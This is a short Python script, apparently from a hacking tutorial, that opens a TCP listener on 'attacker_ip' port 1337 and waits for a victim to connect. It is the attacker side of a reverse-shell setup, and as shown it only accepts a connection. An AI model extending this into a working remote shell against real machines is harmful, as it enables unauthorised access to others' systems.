import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

## If there will be a communication to be accepted
## use accept method to listener, then get the connection and address
connection, address = listener.accept()
print(f"Connected to {address}")
